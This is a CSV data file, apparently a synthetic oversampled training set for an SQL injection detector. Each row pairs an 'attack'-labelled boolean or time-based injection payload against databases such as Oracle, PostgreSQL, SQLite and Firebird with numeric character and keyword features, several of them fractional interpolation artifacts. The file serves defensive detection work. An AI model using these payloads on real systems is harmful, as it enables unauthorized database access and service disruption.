id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000310,attack,boolean,-2745   )    )    as aywp where 9735  =  9735 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,nearest_attack_euclidean,R000723,0.24522254359391019,158.52693822899926,37.245510295166795,4.269394931654272,63.0,26.0,49.52693822899924,20.0,0.39751635111903605,0.16405436712849106,0.31223361473055666,0.1261956670219162,4.245510295166793,0.0,3.0,0.0,0.0,2.0,0.0,5.754489704833207,0.0,0.0,0.0,9.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000311,attack,boolean,"1%'  )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R001050,0.09384234996469186,126.81002824955783,28.0,3.9529608657729267,62.0,10.0,34.694309928192425,20.115718321365403,0.4890666098894506,0.07888171127249204,0.27341819372641596,0.15863348511164127,1.0,0.0,2.0,0.0,1.0,1.0,0.0,5.115718321365405,1.0,5.0,4.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000312,attack,boolean,"1""  )   and make_set  (  4553  =  8132,8132  )   and   (  ""pfci"" like ""pfci",nearest_attack_euclidean,R001450,0.28329456398438063,74.86151827174821,25.861518271748213,3.8609709504362355,24.446073086992858,13.0,26.276963456503573,11.138481728251785,0.3264716260776142,0.17365770494905824,0.3510581593103269,0.14881250966300064,0.0,4.0,0.0,0.0,0.0,1.1384817282517856,0.0,4.0,0.0,1.0,1.0,1.1384817282517852,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000313,attack,boolean,"1""  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001491,0.2156426646797473,96.5097742615628,28.1225564346093,3.6360304193750594,31.0,13.0,38.50977426156279,14.0,0.3212722533966914,0.13472707400506415,0.39890997751586765,0.14509069508237676,0.0,1.0,2.0,0.0,1.0,1.0,0.0,6.877443565390697,0.12255643460930243,1.0,1.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000314,attack,boolean,"1""   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   ""ampn"" like ""ampn",nearest_attack_euclidean,R000229,1.1048498048675157,165.27083105993844,31.0,3.851784309231487,77.10185286224959,8.0,59.745367844376055,20.423610353312817,0.4671904514829026,0.04844111624115792,0.36094660265429046,0.12342182962164899,0.0,4.0,0.0,0.0,1.0,1.4745367844376058,0.0,8.94907356887521,0.0,0.0,2.0,2.474536784437606,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000315,attack,boolean,"1""   )    )     )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  ""tkkg""  =  ""tkkg",nearest_attack_euclidean,R000795,0.694016936382338,156.75515391344823,32.0,3.362783171387683,41.34020521793098,15.0,76.0,24.414948695517253,0.26346105955008414,0.09571421932454516,0.4849520445776955,0.15587267654767525,2.0,4.0,0.0,1.0,0.0,2.0,0.0,14.0,0.4149486955172552,0.0,1.0,3.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000316,attack,boolean," select * from users where id  =  1 or ""_  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000032,0.2295097348046463,63.0,22.0,3.48889649539661,26.0,4.0,24.0,9.0,0.4126984126984127,0.06349206349206349,0.38095238095238093,0.14285714285714285,0.0,2.0,2.0,0.0,1.0,2.0,0.0,1.0,0.0,0.6701850789820346,0.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000317,attack,boolean,"1'  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  'lfhx'  =  'lfhx",nearest_attack_euclidean,R000843,0.20181317910961694,150.19712860709024,31.16487478781822,4.029333801814576,80.84587648527244,8.0,43.68100169745422,17.670250424363555,0.538507043274956,0.053365194691622375,0.29048070320989217,0.11764705882352941,4.0,0.0,0.0,0.0,1.0,2.0,0.0,5.670250424363556,0.0,0.0,2.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000318,attack,boolean,-5067'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'vkab' like 'vkab,nearest_attack_euclidean,R001399,0.01638090860785255,165.02285418021253,36.99085832791498,4.105630866880554,66.9451499674899,18.036566688340073,57.045708360425095,22.99542916395749,0.40568336950308703,0.10929134147352178,0.3456769765132986,0.1393483125100926,7.981716655829964,0.0,1.0,0.0,0.0,1.004570836042509,0.0,8.009141672085018,0.0,0.0,0.0,6.004570836042509,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000319,attack,boolean,"-8256""   )    )     )   or 6872  =  6872 and    (    (     (  ""lrtu""  =  ""lrtu",nearest_attack_euclidean,R000556,0.3094446589302197,76.18324725859927,19.726701096560298,3.018280672064848,13.0,12.0,38.546597806879404,12.636649451719851,0.17111949201323712,0.15795645416606502,0.5051479522233453,0.16577610159735257,0.0,4.0,1.0,0.0,0.0,2.0,0.0,5.636649451719852,0.0,0.0,0.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000320,attack,boolean,"1""  )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000765,0.5870067710036444,123.98253988114719,30.821475280134965,4.16725988152855,66.87516348047237,8.410737640067481,33.46442584040489,15.232212920202446,0.5399611924238964,0.06787829983663209,0.269541975188915,0.12261853255055655,0.0,1.0,2.0,0.0,1.0,1.0,0.0,4.410737640067482,0.0,0.0,2.410737640067482,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000321,attack,boolean,"1'||  (  select 'wtdz' from dual where 1866  =  1866 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R001544,1.5681518018765455,166.0241535438905,36.0,4.312347602209726,87.0,16.0,43.0241535438905,20.0,0.5240391450437861,0.09637501518046641,0.25911707080016444,0.12046876897558302,3.0,0.0,2.0,0.0,1.0,2.0,0.0,5.0,0.0,0.0,2.0,7.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,2.0,0.0,1.0,1.512076771945249,0.4879232280547509,0.512076771945249,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.512076771945249
SMOTE_000322,attack,boolean,"1""   )    )    as ktue where 6392  =  6392 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000245,0.10979578800448166,158.0,35.5312595586731,4.166325837034535,76.0,16.0,49.0,17.0,0.4810126582278481,0.10126582278481013,0.310126582278481,0.10759493670886076,0.0,1.0,2.0,0.0,1.0,2.0,0.0,6.0,0.0,0.0,2.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000323,attack,boolean,"1%""   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R001140,0.05103676422177592,81.61584029149499,21.97256002082107,3.179885173938966,13.0,13.0,39.67072024985285,15.945120041642141,0.15943222313675845,0.15943222313675845,0.48571833730777153,0.19541721641871157,0.0,4.0,0.0,0.0,0.0,2.0,0.0,5.9451200416421415,2.0,1.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000324,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  'ztmd'  =  'ztmd",nearest_attack_euclidean,R000066,0.2443455912738932,145.15995227623642,34.36800954475272,3.979799687630919,59.0,10.0,51.527961820989134,24.631990455247283,0.4065614072866749,0.06890871309943643,0.3548497133776407,0.169680166236248,3.0,0.0,0.0,0.0,0.0,1.0,0.0,10.631990455247283,0.0,2.0,1.0,7.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,1.0,0.0,0.0,1.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000325,attack,boolean,-6178   )    )    as lygb where 9559  =  9559 or   (  8459  =  8459  )  *4906--,nearest_attack_euclidean,R001333,0.043509424183119594,79.0,25.0,3.507673395844937,13.0,24.0,32.0,10.0,0.16455696202531644,0.3037974683544304,0.4050632911392405,0.12658227848101267,0.0,0.0,3.0,0.0,1.0,2.0,0.0,4.0,0.0,0.0,0.0,6.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000326,attack,boolean,"1""   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""mjkl""  =  ""mjkl",nearest_attack_euclidean,R001145,1.1944281324161143,162.32379229470152,34.0,3.9471418522705575,61.35241541059696,15.0,61.64758458940304,24.32379229470152,0.3782803001786265,0.09242021891885854,0.37956549495601355,0.1497339859465014,4.0,4.0,0.0,0.0,0.0,2.0,0.0,8.66189614735076,0.6618961473507603,0.0,0.0,6.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,1.0,0.0,0.0,1.0,2.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000327,attack,boolean,"1'   )    )    and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   'lwyo'  =  'lwyo",nearest_attack_euclidean,R001478,0.20892302354650766,134.1127851018171,31.0,3.555649412333771,43.0,13.0,59.38238723012896,18.73039787168816,0.32106739637306314,0.09706688727557723,0.442208580767038,0.13965713558432163,4.0,0.0,0.0,0.0,1.0,2.0,0.0,9.730397871688162,0.0,1.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,2.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000328,attack,boolean,"-6534%'   )    )    or make_set  (  4107  =  9457,9457  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000640,0.5531661445791209,82.69702660305686,25.618215961834107,3.2865757906993323,10.157621282445476,16.0,40.0,16.53940532061137,0.12221080731929165,0.19365405505163097,0.4841351376290774,0.2,4.0,0.0,1.0,0.0,0.0,2.0,0.0,6.0,2.0,0.5394053206113689,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000329,attack,boolean,"1   )    )    as vzgo where 6281  =  6281 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R001177,0.04926557800481856,156.5893140216795,34.94866425270994,4.137896032783549,76.05133574729007,16.0,48.589314021679506,15.94866425270994,0.48575521936805444,0.10219172297923003,0.3102058698901973,0.10184718776251821,0.0,0.0,2.0,0.0,1.0,2.0,0.0,5.948664252709938,0.0,0.0,2.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000330,attack,boolean,"1' where 8360  =  8360 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R001060,0.2759749052143282,143.52708385202197,34.083749688786824,3.9172305084206474,41.0,24.0,53.221667081617575,25.305416770404392,0.28573294826420903,0.16725831117904918,0.37070366797377374,0.17630507258296801,1.0,0.0,2.0,0.0,0.0,2.0,0.0,10.305416770404392,0.0,2.0,1.0,10.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000331,attack,boolean,"-4259'   )    )    as usqu where 5419  =  5419 or elt  (  8325  =  8837,8837  )  --",nearest_attack_euclidean,R001036,0.004099291458995223,83.0,26.0,3.6971298798425,15.999999999999996,24.0,32.0,11.0,0.19277108433734938,0.28915662650602414,0.3855421686746988,0.13253012048192772,1.0,0.0,3.0,0.0,0.0,2.0,0.0,4.0,0.0,0.0,1.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000332,attack,boolean,1'  )   rlike   (  select   (  case when   (  2671  =  4485  )   then 1 else 0x28 end   )    )    and   (  'ezco' like 'ezco,nearest_attack_euclidean,R001435,0.14955526435866104,125.36321628669349,28.902627408093323,3.5583345570111446,46.0,13.0,53.16847110288013,13.194745183813357,0.3673031820250175,0.10380307318098321,0.42367947462886135,0.10521427016513796,4.0,0.0,0.0,0.0,0.0,1.0,0.0,8.194745183813355,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000333,attack,boolean,"1'   )    )    and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   'nvsy' like 'nvsy",nearest_attack_euclidean,R000387,1.3255213399511423,153.43326722034436,31.48194719915232,4.042312116330483,78.0,10.0,44.36105601695363,21.072211203390726,0.5115067765662213,0.06557779186746429,0.2857587712400066,0.13715666032630774,4.0,0.0,0.0,0.0,1.0,1.0,0.0,6.072211203390726,0.0,5.0,4.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,2.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000334,attack,boolean,select * from users where id  =  1 +   (  \.  )   or 1  =  1 -- 1,nearest_attack_euclidean,R000016,0.814956097601361,64.06528676247065,23.532643381235324,3.4436791847254473,24.0,4.0,26.532643381235324,9.532643381235323,0.3747089420514541,0.06245149034190903,0.4141292007798751,0.14871036682676178,0.0,0.0,2.0,0.0,1.0,2.0,0.0,2.0,0.46735661876467705,0.0,0.0,5.532643381235323,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000335,attack,boolean,"1%"" or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R001363,0.7969543727774256,104.5172238244802,34.5172238244802,3.810939012291925,31.0,15.0,42.0,16.517223824480197,0.2966086136850837,0.14352029694439533,0.40185683144430695,0.15801425792621404,2.0,1.0,2.0,1.0,0.0,1.0,0.0,8.0,0.5172238244801961,0.0,1.0,4.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000336,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  'hmsu'  =  'hmsu",nearest_attack_euclidean,R001481,0.3808831687596369,150.3266506376037,34.72277911353302,3.9264735054927815,59.0,10.0,55.77220886466976,25.554441772933952,0.39296314603950633,0.06660392305754345,0.3704360680834064,0.16999686281954385,3.0,0.0,0.0,0.0,0.0,1.0,0.0,11.554441772933952,0.0,2.0,1.0,7.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,1.0,0.0,0.0,1.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000337,attack,boolean,"1'   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R001088,0.09962541476456227,137.17689448600794,30.0,3.8761610430458715,63.0,10.0,43.34151558880636,20.83537889720159,0.4593470440983709,0.07291222922196364,0.31586279796616146,0.151877928713504,1.0,0.0,2.0,0.0,1.0,1.0,0.0,6.83537889720159,0.0,5.0,4.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000338,attack,boolean,"1'+  (  select fhbk where 2570  =  2570 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   +'",nearest_attack_euclidean,R000345,0.981685260568213,164.5967184799269,33.1934369598538,4.104551233291154,77.59671847992689,18.0,47.0,22.0,0.4714306913434457,0.10935916730825261,0.28554893686043736,0.1336612044878643,2.0,0.0,0.0,0.0,1.0,2.0,0.0,6.0,0.0,5.0,4.0,5.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,2.0,0.0,1.0,1.0,0.5967184799268976,0.40328152007310236,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000339,attack,boolean,-5229'   )    )    as tkqp where 9253  =  9253 or 9323  =  9323#,nearest_attack_euclidean,R000656,0.7096478029589977,64.0,21.676460830199737,3.458122264035185,13.0,20.0,24.0,7.0,0.203125,0.3125,0.375,0.109375,0.7745130566000877,0.22548694339991215,1.0,0.0,0.0,2.0,0.0,2.0,0.0,0.0,0.0,3.0,0.7745130566000877,0.2254869433999122,0.0,1.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
